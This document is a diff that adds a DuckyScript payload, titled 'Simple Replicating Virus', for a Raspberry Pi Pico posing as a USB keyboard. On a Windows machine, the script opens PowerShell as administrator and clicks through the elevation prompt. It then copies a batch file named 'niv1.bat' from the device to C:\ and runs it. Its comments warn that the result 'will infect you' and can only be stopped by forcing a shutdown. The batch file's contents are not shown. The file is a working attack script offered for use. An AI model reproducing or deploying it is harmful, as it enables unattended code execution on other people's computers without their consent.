@@ -1,0 +1,18 @@
+REM Simple Replicating Virus << WINDOWS >>
+REM Author: XfinityAlpha
+REM Change 'CIRCUITPY' to ur Rubber ducky (Raspberry pi pico) device name
+REM "niv1.bat" = Non Infectious Virus 1 (Paste this into your Rubber ducky (Raspberry pi pico))
+
+DELAY 3000
+WINDOWS R
+DELAY 1000
+STRING powershell  
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFT ENTER
+DELAY 2200
+STRING $u=gwmi win32_volume|?{$_.label -eq 'CIRCUITPY'}|select name;cd $u.name;xcopy "niv1.bat" "C:\";cd C:\;.\niv1.bat
+ENTER
+REM Unplug once the command is executed and saved
+REM remember to stop the script when plugging into your machine or else virus will infect you
+REM To stop & remove virus >> Force Shutdown (Holding down the Power Button)
